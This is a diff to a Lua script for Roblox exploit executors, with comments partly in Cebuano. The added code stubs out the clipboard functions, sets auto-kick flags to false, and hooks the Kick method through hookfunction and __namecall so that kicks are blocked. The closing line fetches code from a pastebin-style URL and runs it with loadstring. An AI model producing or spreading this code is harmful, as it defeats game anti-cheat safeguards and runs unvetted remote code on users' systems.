@@ -1,4 +1,4 @@
--- anti-clipboard hook (run FIRST)
+-- 1. Anti-clipboard hook
 pcall(function()
     getgenv().setclipboard = function() end
     getgenv().toclipboard = function() end
@@ -8,5 +8,40 @@ pcall(function()
     end
 end)
 
--- THEN run main script
+-- 2. DISABLE AUTO-KICK FLAGS (Gawas sa Loadstring)
+-- Daghang script ang naggamit ug environment flags para sa auto-kick settings
+getgenv().AutoKick = false
+getgenv().KickOnDetection = false
+getgenv().AntiAFKKick = false
+_G.AutoKick = false
+
+-- 3. HOOK & DISABLE KICK FUNCTION GLOBALLY
+pcall(function()
+    local LocalPlayer = game:GetService("Players").LocalPlayer
+
+    -- Method A: Hooking the Kick method directly
+    if hookfunction then
+        local oldKick
+        oldKick = hookfunction(LocalPlayer.Kick, function(self, ...)
+            -- Ig-call sa script ang Kick(), ato lang i-ignore ug i-log sa console
+            warn("[Anti-Kick] Na-block ang auto kick attempt sa loadstring script!")
+            return nil
+        end)
+    end
+
+    -- Method B: Overriding LocalPlayer:Kick via Metamethod
+    if hookmetamethod then
+        local oldNamecall
+        oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
+            local method = getnamecallmethod()
+            if self == LocalPlayer and (method:lower() == "kick") then
+                warn("[Anti-Kick] Blocked __namecall kick attempt!")
+                return nil
+            end
+            return oldNamecall(self, ...)
+        end)
+    end
+end)
+
+-- 4. THEN run main script
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/6RPq8cgwRB/0"))()
